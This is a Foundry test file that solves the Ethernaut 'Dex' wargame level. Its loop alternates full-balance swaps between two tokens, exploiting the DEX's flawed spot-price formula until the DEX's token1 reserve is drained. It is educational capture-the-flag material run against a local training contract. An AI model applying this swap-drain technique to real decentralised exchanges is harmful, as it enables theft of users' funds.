// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/DexFactory.sol";
import "../src/Ethernaut.sol";

contract DexTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether);
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a <= b ? a : b;
    }

    function testDexHack() public {
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));

        address token1Address = ethernautDex.token1();
        address token2Address = ethernautDex.token2();

        ERC20(token1Address).approve(address(ethernautDex), type(uint256).max);
        ERC20(token2Address).approve(address(ethernautDex), type(uint256).max);

        bool flip = true;
        while (ethernautDex.balanceOf(token1Address, ethernautDex) > 0) {
            emit log_named_uint(
                "DEX -- Token 1",
                ethernautDex.balanceOf(token1Address, address(ethernautDex))
            );
            emit log_named_uint(
                "DEX -- Token 2",
                ethernautDex.balanceOf(token2Address, address(ethernautDex))
            );
            emit log_named_uint(
                "USER -- Token 1",
                ethernautDex.balanceOf(token1Address, player)
            );
            emit log_named_uint(
                "USER -- Token 2",
                ethernautDex.balanceOf(token2Address, player)
            );
            emit log("");

            if (flip) {
                uint256 amount = min(
                    ethernautDex.balanceOf(token1Address, player),
                    ethernautDex.balanceOf(token1Address, ethernautDex)
                );
                ethernautDex.swap(token1Address, token2Address, amount);
                flip = false;
            } else {
                uint256 amount = min(
                    ethernautDex.balanceOf(token2Address, player),
                    ethernautDex.balanceOf(token2Address, ethernautDex)
                );
                ethernautDex.swap(token2Address, token1Address, amount);
                flip = true;
            }
        }

        emit log_named_uint(
            "DEX -- Token 1",
            ethernautDex.balanceOf(token1Address, address(ethernautDex))
        );
        emit log_named_uint(
            "DEX -- Token 2",
            ethernautDex.balanceOf(token2Address, address(ethernautDex))
        );
        emit log_named_uint(
            "USER -- Token 1",
            ethernautDex.balanceOf(token1Address, player)
        );
        emit log_named_uint(
            "USER -- Token 2",
            ethernautDex.balanceOf(token2Address, player)
        );
        emit log("");

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
